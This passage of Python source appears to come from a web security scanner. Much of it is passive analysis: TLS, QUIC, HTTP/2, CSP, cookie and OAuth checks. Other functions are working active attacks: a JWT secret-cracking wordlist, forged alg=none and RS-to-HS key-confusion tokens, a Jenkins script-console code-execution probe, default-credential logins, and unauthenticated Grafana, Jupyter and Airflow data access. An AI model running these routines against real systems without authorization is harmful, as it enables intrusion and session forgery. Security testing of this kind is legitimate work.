                    pem = ssl.DER_cert_to_PEM_cert(chain[0].public_bytes())
                fd, tf = tempfile.mkstemp(prefix="sxe_crt_", suffix=".pem")
                with os.fdopen(fd, "w") as f:
                    f.write(pem)
                try:
                    import _ssl
                    cert = _ssl._test_decode_cert(tf) or {}
                finally:
                    os.unlink(tf)
        except Exception:
            cert = {}
    if not cert:
        return None
    subj = {}
    for r in cert.get("subject", ()):
        for k, v in r:
            subj[k] = v
    return {"issuer": subj.get("organizationName", ""),
            "notAfter": cert.get("notAfter", ""),
            "sans": [v for t, v in cert.get("subjectAltName", ()) if t == "DNS"],
            "alpn": alpn}


async def quic_one(host, findings, sem):
    """HTTP/3 probe: send a QUIC v1 Initial (padded to 1200 bytes) to udp/443.
    a Version Negotiation or Initial reply proves a live QUIC endpoint."""
    async with sem:
        try:
            dcid = os.urandom(8)
            pkt = bytearray([0xC0])                    # long hdr, fixed bit
            pkt += b"\x00\x00\x00\x01"                 # QUIC version 1
            pkt.append(len(dcid)); pkt += dcid         # DCID
            pkt.append(0)                              # SCID length
            pkt.append(0)                              # token length (varint 0)
            rest = 1200 - (1 + 4 + 1 + 8 + 1 + 1 + 2)
            pkt += bytes([0x40 | (rest >> 8), rest & 0xFF])   # 2-byte varint
            pkt += os.urandom(rest)                    # padding to >= 1200

            loop = asyncio.get_running_loop()
            fut = loop.create_future()

            class _P(asyncio.DatagramProtocol):
                def datagram_received(self, data, addr):
                    if not fut.done():
                        fut.set_result(data)
                def error_received(self, exc):
                    if not fut.done():
                        fut.set_exception(exc)

            tr, _ = await loop.create_datagram_endpoint(
                _P, remote_addr=(host, 443))
            try:
                tr.sendto(bytes(pkt))
                data = await asyncio.wait_for(fut, 4)
            finally:
                tr.close()
            if data and len(data) >= 5 and (data[0] & 0x80):
                ver = int.from_bytes(data[1:5], "big")
                if ver == 0:
                    sup = [f"0x{int.from_bytes(data[i:i+4], 'big'):08x}"
                           for i in range(5, min(len(data), 21), 4)]
                    findings.append(
                        f"[H3-QUIC] {host}:443 answered QUIC Version "
                        f"Negotiation on udp/443 ({', '.join(sup[:4])}) - "
                        f"HTTP/3 endpoint")
                else:
                    findings.append(
                        f"[H3-QUIC] {host}:443 answered a QUIC Initial "
                        f"(version 0x{ver:08x}) on udp/443 - HTTP/3 endpoint")
        except Exception:
            return


_H2_SET = {1: "HEADER_TABLE_SIZE", 2: "MAX_CONCURRENT_STREAMS",
           3: "INITIAL_WINDOW_SIZE", 4: "MAX_FRAME_SIZE",
           5: "MAX_HEADER_LIST_SIZE", 6: "UNKNOWN_6", 8: "ENABLE_CONNECT_PROTOCOL"}


async def h2c_one(host, findings, sem):
    """plaintext HTTP/2 (h2c) probe: client preface + empty SETTINGS frame;
    a SETTINGS reply proves h2c and yields the server SETTINGS fingerprint."""
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 80), 5)
        except Exception:
            return
        try:
            writer.write(b"PRI * HTTP/1.1\r\n\r\nSM\r\n\r\n"
                         b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
            await writer.drain()
            data = await asyncio.wait_for(reader.read(1024), 4)
        except Exception:
            return
        finally:
            try:
                writer.close()
            except Exception:
                pass
        try:
            if not data or len(data) < 9 or data[3] != 0x04:
                return                       # HTTP/1.x reply: not h2c
            ln = int.from_bytes(data[0:3], "big")
            pay = data[9:9 + ln]
            pairs = []
            for i in range(0, len(pay) - 5, 6):
                sid = int.from_bytes(pay[i:i + 2], "big")
                val = int.from_bytes(pay[i + 2:i + 6], "big")
                pairs.append(f"{_H2_SET.get(sid, sid)}={val}")
            fp = ", ".join(pairs[:6]) or "empty"
            findings.append(
                f"[H2C] {host}:80 speaks plaintext HTTP/2 (h2c) - "
                f"SETTINGS fingerprint [{fp}]")
        except Exception:
            return


async def tls_batch(hosts, findings, domains):
    """TLS cert intel + SAN -> new subdomain candidates."""
    sem, out = asyncio.Semaphore(60), {}
    res = await asyncio.gather(*[tls_one(h, findings, sem) for h in hosts],
                               return_exceptions=True)
    qsem = asyncio.Semaphore(30)
    # protocol fingerprints: HTTP/3 (QUIC on udp/443) + plaintext HTTP/2
    await asyncio.gather(*[quic_one(h, findings, qsem) for h in hosts],
                         return_exceptions=True)
    await asyncio.gather(*[h2c_one(h, findings, qsem) for h in hosts],
                         return_exceptions=True)
    newc = set()
    for r in res:
        if isinstance(r, BaseException) or not r:
            continue                    # one dead host must not kill the batch
        h, info = r
        if not info:
            continue
        out[h] = info
        for san in info["sans"]:
            s = san.lower().lstrip("*.")
            if s and "." in s and any(s == d or s.endswith("." + d) for d in domains):
                newc.add(s)
    newc -= set(hosts)
    if out:
        print(f"      tls: {len(out)} certs, {len(newc)} new names from SANs", flush=True)
    return out, newc


# ---------------- phase 5: http probe ----------------
def fp_match(body):
    if not body:
        return ""
    lb = body.lower()
    for name, pats in TAKEOVER.items():
        if any(p.lower() in lb for p in pats):
            return name
    return ""


# ---------------- header/content security analysis (C1/C2) ----------------
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{4,}")
B64URL = re.compile(r"^[A-Za-z0-9_\-]+$")


def _b64url_json(part):
    try:
        if not part or not B64URL.match(part.decode() if isinstance(part, bytes) else part):
            return None
        s = part.decode() if isinstance(part, bytes) else part
        return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
    except Exception:
        return None


_JWT_SECRETS = (b"secret", b"password", b"123456", b"admin", b"key", b"jwt",
                b"changeme", b"supersecret", b"secretkey", b"your-256-bit-secret",
                b"private", b"token", b"auth", b"test", b"pass", b"qwerty",
                b"jwt-secret", b"mysecret", b"keyboard cat", b"abc123",
                b"12345678", b"secret123", b"jwtsecret", b"default", b"",
                b"production", b"app-secret", b"hunter2", b"letmein",
                b"shhh", b"password1", b"root", b"guest", b"sxe")
_JWT_HS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
           "HS512": hashlib.sha512}


def jwt_crack(tok, parts, hdr, extra=()):
    """HMAC-verify an HS* token against a small known-secret wordlist -> secret or None."""
    alg = str(hdr.get("alg", ""))
    if alg not in _JWT_HS or not parts[2]:
        return None
    signing = f"{parts[0]}.{parts[1]}".encode()
    for sec in _JWT_SECRETS + tuple(extra):
        mac = hmac.new(sec, signing, _JWT_HS[alg]).digest()
        if hmac.compare_digest(
                base64.urlsafe_b64encode(mac).rstrip(b"=").decode(), parts[2]):
            return sec.decode() or "(empty secret)"
    return None


def jwt_scan(host, blob, findings, max_tokens=6):
    """flag weak JWTs embedded in page/cookie content (alg=none, kid, admin claims)."""
    if not blob:
        return
    data = blob if isinstance(blob, bytes) else blob.encode("utf-8", "ignore")
    seen, n, first_alg, specifics = set(), 0, "", 0
    exp_reported = False
    for m in JWT_RE.finditer(data.decode("latin-1", "ignore")):
        tok = m.group(0)
        if tok in seen:
            continue
        seen.add(tok)
        n += 1
        if n > max_tokens:
            break
        parts = tok.split(".")
        if len(parts) != 3:
            continue
        hdr, claims = _b64url_json(parts[0]), _b64url_json(parts[1])
        if not isinstance(hdr, dict) or not isinstance(claims, dict):
            continue
        alg = str(hdr.get("alg", ""))
        first_alg = first_alg or alg or "?"
        kid = str(hdr.get("kid", ""))
        if alg.lower() == "none":
            specifics += 1
            findings.append(f"[JWT-NONE] {host}: alg=none JWT embedded in content "
                            f"- server must reject unsigned tokens")
        if kid and ("../" in kid or "..\\" in kid or "/" in kid or "\x00" in kid):
            specifics += 1
            findings.append(f"[JWT-KID] {host}: JWT kid is path-like ({kid[:50]}) "
                            f"- validate kid against an allowlist")
        for _hk in ("jku", "x5u"):
            _ju = str(hdr.get(_hk, ""))
            if _ju.startswith(("http://", "https://")):
                _d = re.sub(r"^\w+://", "", _ju).split("/")[0].split(":")[0]
                if _d and _d != host and not host.endswith("." + _d):
                    specifics += 1
                    findings.append(
                        f"[JWT-JKU] {host}: JWT references external {_hk} key "
                        f"source {_d[:50]} - key-fetch SSRF / key-confusion "
                        f"surface, pin the key URL")
                    break
        if isinstance(hdr.get("jwk"), dict) and hdr["jwk"].get("kty"):
            specifics += 1
            findings.append(
                f"[JWT-JWK] {host}: JWT embeds its own verification key "
                f"(jwk header, kty={hdr['jwk'].get('kty')}) - any token "
                f"forgeable, strip embedded JWKs and pin keys server-side")
        if alg in _JWT_HS:
            extra = tuple(w.encode() for w in
                          re.split(r"[.\-_]", host.lower()) if 3 <= len(w) <= 20)
            secret = jwt_crack(tok, parts, hdr, extra + (host.encode(),))
            if secret:
                specifics += 1
                findings.append(f"[JWT-WEAK] {host}: {alg} signature cracked "
                                f"with known secret {secret!r} - any token "
                                f"forgeable, rotate the secret")
        priv = []
        if str(claims.get("admin", "")).lower() in ("true", "1", "yes"):
            priv.append("admin=true")
        for k in ("role", "roles", "role_name", "permissions"):
            v = claims.get(k)
            if isinstance(v, (list, dict)):
                v = json.dumps(v)
            if v and "admin" in str(v).lower():
                priv.append(f"{k}={str(v)[:60]}")
        if priv:
            specifics += 1
            findings.append(f"[JWT-ADMIN] {host}: privileged claims in client JWT "
                            f"({', '.join(priv)})")
        if not exp_reported and "exp" not in claims:
            exp_reported = True
            specifics += 1
            missing = [k for k in ("iss", "aud") if k not in claims]
            findings.append(
                f"[JWT-EXP] {host}: JWT without an `exp` claim"
                + (f" (also missing {', '.join(missing)})" if missing else "")
                + " - token never expires")
    if n:
        findings.append(f"[JWT] {host}: {min(n, max_tokens)} JWT token(s) in client "
                        f"content (alg={first_alg})")


_A_BLANK_RX = re.compile(
    rb"<a\b[^>]*\btarget\s*=\s*['\"]?_blank['\"]?[^>]*>", re.I)


def tabnab_scan(host, body, findings, floor=3):
    """reverse tabnabbing: target=_blank links without rel=noopener let the
       opened page window.opener.location-hijack the original tab."""
    if not body or b"target" not in body.lower():
        return
    bad = 0
    for m in _A_BLANK_RX.finditer(body):
        tag = m.group(0).lower()
        if b"rel=" in tag and (b"noopener" in tag or b"noreferrer" in tag):
            continue
        bad += 1
    if bad >= floor:
        findings.append(
            f"[TABNAB] {host}: {bad} target=_blank link(s) without "
            f"rel=noopener/noreferrer - reverse tabnabbing "
            f"(window.opener.location hijack)")


_TOKEN_PARAM_RX = re.compile(
    r"(?i)[?&](access_token|refresh_token|id_token|auth_token)"
    r"=([^&#\s\"']{8,})")


def token_url_scan(probes, findings):
    """passive: operator/probed redirect chains that carry OAuth tokens in
       the query string leak them via Referer + browser history + logs."""
    seen = set()
    pkce_seen = set()
    for h, info in (probes or {}).items():
        urls = list(info.get("chain") or [])
        fu = info.get("final_url") or ""
        if fu:
            urls.append(fu)
        for u in urls:
            for m in _TOKEN_PARAM_RX.finditer(str(u)):
                key = (h, m.group(1).lower(), m.group(2)[:12])
                if key in seen:
                    continue
                seen.add(key)
                findings.append(
                    f"[OAUTH-TOKEN-URL] {h}: redirect chain carries "
                    f"{m.group(1)} in the query string (redacted value) - "
                    f"tokens leak via Referer, history and proxy logs; use "
                    f"fragment or POST body instead")
            # authorization-code flow without PKCE: an intercepted/leaked
            # code can be redeemed by any client (no code_verifier needed)
            us = str(u)
            if ("response_type=code" in us.lower()
                    and "code_challenge" not in us.lower()
                    and h not in pkce_seen):
                pkce_seen.add(h)
                findings.append(
                    f"[OAUTH-PKCE] {h}: authorize URL uses "
                    f"response_type=code without code_challenge - no PKCE, "
                    f"stolen authorization codes are redeemable by any "
                    f"client (use S256 code_challenge)")
            if ("response_type=token" in us.lower()
                    and h not in pkce_seen):
                pkce_seen.add(h)
                findings.append(
                    f"[OAUTH-IMPLICIT] {h}: authorize URL uses "
                    f"response_type=token (implicit flow) - tokens ride "
                    f"in the URL fragment, leak via history/Referer/"
                    f"browser extensions; switch to auth-code + PKCE")


async def jenkins_rce(probes, findings, cap=8):
    """Jenkins script console: POST /scriptText executes Groovy for anyone
       with Overall/Read on many instances - the canary coming back is
       remote code execution, full stop."""
    tried = 0
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "jenkins" not in tech:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        for pth in ("/scriptText", "/script"):
            try:
                async with HTTP_SEM:
                    async with tsession(aiohttp.TCPConnector(
                            limit=0, ssl=False)) as s:
                        async with s.post(
                                base + pth,
                                data="script=println('sxeJek7')",
                                headers={**UA, "Content-Type":
                                         "application/x-www-form-urlencoded"},
                                timeout=aiohttp.ClientTimeout(total=8),
                                ssl=False, allow_redirects=False) as r:
                            if r.status != 200:
                                continue
                            body = await r.content.read(16000)
                if b"sxeJek7" in body:
                    findings.append(
                        f"[JENKINS-RCE] {h}{pth} executes our Groovy "
                        f"println canary - unauthenticated script console, "
                        f"host is owned (authorize: Overall/RunScripts)")
                    return
            except Exception:
                continue


async def grafana_scan(probes, findings, cap=8):
    """Grafana /api/datasources needs Admin by default - a 200 list means
       anonymous/elevated access to DB URLs, usernames and passwords."""
    tried = 0
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "grafana" not in tech:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        try:
            async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
                async with s.get(base + "/api/datasources", headers=UA,
                                 timeout=aiohttp.ClientTimeout(total=8),
                                 ssl=False, allow_redirects=False) as r:
                    if r.status != 200:
                        continue
                    body = await r.content.read(200_000)
        except Exception:
            continue
        if body.lstrip()[:1] == b"[" and len(body.strip()) > 2:
            findings.append(
                f"[GRAFANA-DATA] {h}/api/datasources returns a datasource "
                f"list anonymously (Admin-level API) - database URLs, "
                f"usernames and passwords inside")
            return


async def wp_enum(probes, findings, cap=8):
    """WordPress unauthenticated user oracles: /?author=1 redirect and the
       REST /wp-json/wp/v2/users listing."""
    tried = 0
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "wordpress" not in tech:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        try:
            async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
                try:
                    async with s.get(base + "/?author=1", headers=UA,
                                     timeout=aiohttp.ClientTimeout(total=8),
                                     ssl=False, allow_redirects=False) as r:
                        loc = r.headers.get("Location", "")
                        if r.status in (301, 302, 303, 307, 308) and \
                                "/author/" in loc:
                            name = loc.split("/author/")[-1].strip("/").split(
                                "/")[0][:40]
                            findings.append(
                                f"[WP-USER-ENUM] {h}/?author=1 redirects to "
                                f"{loc[:70]} - author archives leak usernames "
                                f"(enumerated: {name or 'unknown'}) - disable "
                                f"author queries or return 403")
                except Exception:
                    pass
                try:
                    async with s.get(base + "/wp-json/wp/v2/users",
                                     headers=UA,
                                     timeout=aiohttp.ClientTimeout(total=8),
                                     ssl=False, allow_redirects=False) as r:
                        if r.status == 200:
                            body = await r.content.read(100_000)
                            if body.lstrip()[:1] == b"[" and (
                                    b'"slug"' in body or b'"name"' in body):
                                findings.append(
                                    f"[WP-REST-USERS] "
                                    f"{h}/wp-json/wp/v2/users lists user "
                                    f"accounts anonymously - usernames for "
                                    f"brute force and credential stuffing; "
                                    f"restrict the REST users endpoint")
                except Exception:
                    pass
        except Exception:
            continue


async def jenkins_default(probes, findings, cap=6):
    """Jenkins default credentials: j_security_check with classic pairs,
       confirmed by landing on the Dashboard with a live session cookie."""
    tried = 0
    pairs = (("admin", "admin"), ("admin", "password"),
             ("tomcat", "s3cret"), ("admin", "123456"))
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "jenkins" not in tech:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        try:
            async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
                for user, pw in pairs:
                    try:
                        async with s.post(
                                base + "/j_security_check",
                                data={"j_username": user, "j_password": pw},
                                headers=UA,
                                timeout=aiohttp.ClientTimeout(total=8),
                                ssl=False, allow_redirects=False) as r:
                            loc = r.headers.get("Location", "")
                            if r.status not in (302, 303) or \
                                    "loginerror" in loc.lower() or \
                                    "login" in loc.lower():
                                continue
                        async with s.get(base + "/", headers=UA,
                                         timeout=aiohttp.ClientTimeout(
                                             total=8),
                                         ssl=False, allow_redirects=True) as r2:
                            if r2.status != 200:
                                continue
                            body = (await r2.content.read(65536)).lower()
                        if b"dashboard [jenkins]" in body or \
                                b"log out" in body:
                            findings.append(
                                f"[JENKINS-DEFAULT] {h} accepts the classic "
                                f"credentials {user}:{pw} on "
                                f"/j_security_check and lands on the "
                                f"Dashboard - change defaults or enable "
                                f"realm hardening immediately")
                            return
                    except Exception:
                        continue
        except Exception:
            continue


async def jupyter_scan(probes, findings, cap=6):
    """Jupyter without auth: /api lists notebooks/kernels/terminals - the
       terminals API is interactive RCE on the host."""
    tried = 0
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "jupyter" not in tech and ":8888" not in h:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        try:
            async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
                for pth in ("/api/terminals", "/api"):
                    try:
                        async with s.get(base + pth, headers=UA,
                                         timeout=aiohttp.ClientTimeout(total=8),
                                         ssl=False, allow_redirects=False) as r:
                            if r.status != 200:
                                continue
                            body = await r.content.read(65536)
                    except Exception:
                        continue
                    if body.lstrip()[:1] in (b"[", b"{") and (
                            b'"terminals"' in body or b'"notebooks"' in body
                            or b'"kernels"' in body):
                        findings.append(
                            f"[JUPYTER-OPEN] {h}{pth} answers unauthenticated "
                            f"- notebook/terminal API means interactive RCE "
                            f"on the host; require token auth on every "
                            f"endpoint")
                        return
        except Exception:
            continue


async def airflow_scan(probes, findings, cap=6):
    """Airflow REST without auth: /api/v1/dags lists DAGs - DAG code holds
       cloud/db credentials and unauth trigger = job RCE."""
    tried = 0
    for h in sorted(probes):
        if tried >= cap:
            break
        info = probes[h]
        if not info.get("status"):
            continue
        tech = " ".join(info.get("tech") or []).lower()
        if "airflow" not in tech:
            continue
        tried += 1
        base = f"{info.get('scheme') or 'https'}://{h}"
        try:
            async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
                async with s.get(base + "/api/v1/dags", headers=UA,
                                 timeout=aiohttp.ClientTimeout(total=8),
                                 ssl=False, allow_redirects=False) as r:
                    if r.status != 200:
                        continue
                    body = await r.content.read(200_000)
        except Exception:
            continue
        if body.lstrip()[:1] == b"{" and b'"dags"' in body:
            findings.append(
                f"[AIRFLOW-DAGS] {h}/api/v1/dags returns the DAG list "
                f"unauthenticated - DAG definitions embed cloud/db secrets "
                f"and the API can trigger runs (job RCE); enable auth on "
                f"the API")
            return


def _jwt_swap(tok, newtok):
    """operator auth headers/cookies with `tok` replaced by `newtok`."""
    hdrs = {}
    for k, v in (AUTH_HEADERS or {}).items():
        if tok in v:
            hdrs[k] = v.replace(tok, newtok)
        else:
            hdrs[k] = v
    return hdrs


def _jwt_none(tok):
    parts = tok.split(".")
    if len(parts) != 3:
        return ""
    hdr = _b64url_json(parts[0])
    if not isinstance(hdr, dict):
        return ""
    hdr["alg"] = "none"
    h = base64.urlsafe_b64encode(
        json.dumps(hdr, separators=(",", ":")).encode()).rstrip(b"=")
    return h.decode() + "." + parts[1] + "."


def _b64u(obj):
    """compact b64url of a dict (as JSON header) or bytes."""
    raw = obj if isinstance(obj, bytes) else json.dumps(
        obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


async def _cert_leaf_pem(hostport, timeout=6):
    """leaf cert as PEM for HS256 key confusion (alg=RS256 -> HS256 with the
       public key as the HMAC secret). accepts 'host:port' or bare host."""
    hp = str(hostport).split(":")
    host = hp[0]
    port = int(hp[1]) if len(hp) > 1 else 443
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        _, w = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
            timeout)
    except Exception:
        return ""
    try:
        ssl_o = w.get_extra_info("ssl_object")
        chain = ssl_o.get_unverified_chain() if ssl_o else None
        if chain:
            c0 = chain[0]
            try:
                return ssl.DER_cert_to_PEM_cert(c0)
            except TypeError:
                # py3.13+ may hand back a Certificate object, not raw DER
                return ssl.DER_cert_to_PEM_cert(c0.public_bytes())
        pc = w.get_extra_info("peercert")
        if pc:
            return ssl.DER_cert_to_PEM_cert(pc)
        return ""
    finally:
        try:
            w.close()
            await asyncio.wait_for(w.wait_closed(), 2)
        except Exception:
            pass


async def jwt_online(s, probes, findings, attrib=None, cap_hosts=6,
                     cap_paths=2):
    """active JWT acceptance tests: replay the operator's live token with an
       alg=none forgery on the same request. a server that serves the SAME
       authenticated response to the forgery while rejecting a tampered-sig
       control accepts unsigned tokens - forgeable sessions."""
    toks = []
    for v in (AUTH_HEADERS or {}).values():
        toks += JWT_RE.findall(v)
    for h in sorted(probes)[:60]:
        for c in probes[h].get("cookies") or []:
            toks += JWT_RE.findall(c)
    toks = list(dict.fromkeys(toks))[:3]
    if not toks:
        return 0
    hits = 0
    interesting = re.compile(
        r"(?i)(admin|account|dashboard|profile|private|backend|console"
        r"|/me\b|/user|/api/)")
    for h in sorted(probes)[:cap_hosts]:
        base = f"{probes[h].get('scheme') or 'https'}://{h}"
        paths = ["/"]
        if attrib:
            for pth in sorted(attrib):
                if interesting.search(pth) and h in attrib[pth]:
                    paths.append(pth if pth.startswith("/") else "/" + pth)
                    if len(paths) >= 1 + cap_paths:
                        break
        for pth in paths[:1 + cap_paths]:
            for tok in toks:
                parts = tok.split(".")
                if len(parts) != 3:
                    continue
                bad = parts[0] + "." + parts[1] + "." + (
                    ("B" if parts[2][:1] != "B" else "A")
                    + parts[2][1:])
                none = _jwt_none(tok)
                if not none or none == tok:
                    continue
                try:
                    r0 = await _grab(s, base + pth, timeout=6, limit=6000)
                    rb = await _grab(s, base + pth, timeout=6, limit=6000,
                                     headers=_jwt_swap(tok, bad))
                    rn = await _grab(s, base + pth, timeout=6, limit=6000,
                                     headers=_jwt_swap(tok, none))
                except Exception:
                    continue
                if not (r0 and rb and rn) or None in (r0[0], rb[0], rn[0]):
                    continue
                st0, b0 = r0[0], r0[1]
                if st0 >= 500 or not b0:
                    continue
                # the app must actually USE the token (tampered control
                # differs from the original response) before an accepted
                # forgery proves the sig is what is being skipped
                tampered = not (rb[0] == st0 and _body_similar(b0, rb[1]))
                accepted = (rn[0] == st0 and _body_similar(b0, rn[1])
                            and tampered)
                if accepted:
                    hits += 1
                    findings.append(
                        f"[JWT-NONE-ACCEPT] {h}{pth} serves the same "
                        f"authenticated response for an alg=none forged JWT "
                        f"(status {st0}, body identical) while a tampered "
                        f"signature is treated differently - sessions "
                        f"forgeable without the secret")
                    break
                # alg confusion: RS256/ES256 -> HS256 signed with the public
                # key / cert PEM the server publishes over TLS
                alg = str((_b64url_json(parts[0]) or {}).get("alg") or "")
                if alg[:2] in ("RS", "ES"):
                    pem = await _cert_leaf_pem(h)
                    if pem:
                        nh = {"alg": "HS256", "typ": "JWT"}
                        signing = (_b64u(nh) + "." + parts[1]).encode()
                        mac = hmac.new(pem.encode(), signing,
                                       hashlib.sha256).digest()
                        conf = _b64u(nh) + "." + parts[1] + "." + _b64u(mac)
                        if conf != tok:
                            rc = await _grab(s, base + pth, timeout=6, limit=6000,
                                             headers=_jwt_swap(tok, conf))
                            if (rc and rc[0] == st0 and _body_similar(b0, rc[1])
                                    and tampered):
                                hits += 1
                                findings.append(
                                    f"[JWT-ALGCONF] {h}{pth} accepts an "
                                    f"HS256-signed JWT using the server's "
                                    f"own TLS certificate as the HMAC key "
                                    f"(status {st0}, body identical, tampered "
                                    f"control rejected) - RS->HS key "
                                    f"confusion, sessions forgeable")
                                break
            if hits:
                break
        if hits:
            break
    return hits


def csp_scan(host, csp, findings):
    """flag weak / exfiltrating Content-Security-Policy directives."""
    if not csp:
        return
    low = csp.lower()
    weak = (("'unsafe-inline'" in low and "'unsafe-eval'" in low)
            or bool(re.search(r"(script|default)-src[^;,]*[\s,]\*", low))
            or ("script-src" in low and "data:" in low))
    if weak:
        findings.append(f"[CSP-WEAK] {host}: weak CSP (unsafe-inline+eval, wildcard "
                        f"or data: script source)")
    elif "'unsafe-inline'" in low:
        findings.append(f"[CSP] {host}: CSP allows 'unsafe-inline' (XSS defense weakened)")
    m = re.search(r"report-uri\s+(\S+)", low)
    if m:
        tgt = m.group(1).strip("'\"")
        if tgt.startswith(("http:", "https:", "//")):
            dom = re.sub(r"^\w+:", "", tgt).lstrip("/")
            dom = re.sub(r"^//", "", dom).split("/")[0].split(":")[0]
            same_apex = (dom.split(".")[-2:] == host.split(".")[-2:]
                          if dom and host else False)
            if dom and dom != host and not same_apex and not host.endswith("." + dom):
                findings.append(f"[CSP-REPORT] {host}: CSP report-uri posts violations "
                                f"to external host {dom}")


SESSION_COOKIE = ("session", "sess", "sid", "auth", "token", "jwt",
                  "access", "refresh", "csrf", "login", "user", "phpsessid")


def cookie_scan(host, cookies, scheme, findings):
    """flag cookies missing Secure/HttpOnly/SameSite (session-ish = stricter).
    attributes are parsed from the ;-tail after name=value, so a cookie merely
    NAMED e.g. 'secureid' no longer counts as having the Secure attribute."""
    for c in cookies or []:
        parts = [p.strip() for p in c.split(";")]
        name = parts[0].split("=", 1)[0].strip()[:40]
        attrs = {p.split("=", 1)[0].strip().lower() for p in parts[1:]}
        missing = [fl for fl in ("secure", "httponly", "samesite")
                   if fl not in attrs]
        if scheme != "https":
            missing = [x for x in missing if x != "secure"]
        sessionish = any(k in name.lower() for k in SESSION_COOKIE)
        if not missing:
            continue
        if sessionish or len(missing) >= 3:
            findings.append(f"[COOKIE] {host}: cookie '{name}' missing "
                            f"{', '.join(m[0].upper() + m[1:] for m in missing)}")


WAF_SIGS = (
    ("cloudflare", ("cf-ray", "cf-mitigated", "cloudflare")),
    ("akamai", ("akamaighost", "x-akamai", "akamai-")),
    ("aws-waf", ("x-amzn-waf", "x-amzn-reqid-waf")),
    ("sucuri", ("x-sucuri-id", "x-sucuri-")),
    ("imperva", ("x-iinfo", "incap-ses", "visid_incap", "incapsula")),
    ("f5-bigip", ("bigipserver", "x-wa-info", "bigip")),
    ("barracuda", ("barracuda",)),
    ("wordfence", ("wordfence",)),
    ("fortiweb", ("fortiweb",)),
    ("modsecurity", ("mod_security", "modsecurity")),
    ("f5-asm", ("ts_", "asmcookies")),
)


def waf_fingerprint(hdr, body=b""):
    """detect a WAF/edge shield in front of the host ('' = none found)."""
    blob = " ".join(f"{k}:{v}" for k, v in (hdr or {}).items()).lower()
    if isinstance(body, (bytes, bytearray)):
        blob += " " + body[:6000].decode("latin-1", "ignore").lower()
    for name, sigs in WAF_SIGS:
        if any(s in blob for s in sigs):
            return name
    return ""


MIXED_RX = re.compile(rb"""(?:src|action|srcset|poster|data|background)\s*=\s*["']http://[^"'\s>]+"""
                      rb"""|url\(\s*["']?http://[^"'\s)>]+"""
                      rb"""|<link\b[^>]*\bhref\s*=\s*["']http://[^"'\s>]+"""
                      rb"""|<(?:script|iframe|embed|object|video|audio|source|img)\b[^>]*\bhref\s*=\s*["']http://[^"'\s>]+""",
                      re.I)
CSRF_RX = re.compile(rb"""(?:name|id|content|class)\s*=\s*["'][^"']*"""
                     rb"""(?:csrf|xsrf|authenticity[_-]token|requestverification"""
                     rb"""|forgery|nonce)""", re.I)
OAUTH_ATTR_RX = re.compile(r"""(?:href|src|action|content)\s*=\s*["']([^"']+)["']""",
                           re.I)


def oauth_state_issue(url):
    """True when an OAuth authorize URL has client_id/response_type but no state."""
    low = (url or "").lower()
    if "state=" in low or "state%3d" in low:
        return False
    if not ("authorize" in low or "oauth" in low or "openid" in low):
        return False
    return "client_id=" in low or "response_type=" in low


SECRET_KEY_SET = {"password", "passwd", "pwd", "secret", "token", "api_key",
                  "apikey", "access_token", "auth_token", "private_key",
                  "client_secret", "session", "otp", "authorization", "bearer",
                  "refresh_token", "id_token",
                  "sessionid", "session_id", "phpsessid", "jsessionid",
                  "aspsessionid", "asp.net_sessionid"}


def is_secret_key(k):
    k = (k or "").lower()
    if "public" in k:
        return False
    return (k in SECRET_KEY_SET or k.endswith(("_token", "_secret", "_apikey"))
            or (k.endswith("_key") and k != "key"))


def is_cred_value(v):
    """True when a query-string VALUE looks like an actual credential, not a
    flag or documentation placeholder. PARAM-SECRET claims a leak, so an
    empty/short/boilerplate value must never count (no-FP gate: wayback is
    full of bare `?token` flags and example values)."""
    if not v:
        return False
    try:
        v = unquote(v)
    except Exception:
        pass
    v = v.strip().strip("\"'")
    if len(v) < 8:
        return False
    if v.lower() in ("null", "undefined", "true", "false", "none", "nan",
                     "missing", "invalid", "expired", "required", "yes",
                     "no", "on", "off"):
        return False
    if _SECRET_PLACEHOLDER_RX.search(v.encode("utf-8", "ignore")):
        return False
    if _SECRET_RUN_RX.search(v.encode("utf-8", "ignore")):
        return False
    if not re.search(r"[A-Za-z]", v) and len(v) < 16:
        return False          # short digit-only ids are identifiers, not keys
    return True


COMMENT_RX = re.compile(rb"<!--(.*?)-->", re.S)
COMMENT_SENSITIVE = (b"password", b"passwd", b"secret", b"api_key", b"apikey",
                     b"api-key", b"access_token", b"private key", b"begin rsa",
                     b"credentials", b"192.168.", b"172.16.", b"127.0.0.1")
COMMENT_SKIP_RX = re.compile(rb"""type\s*=\s*["']password["']""", re.I)
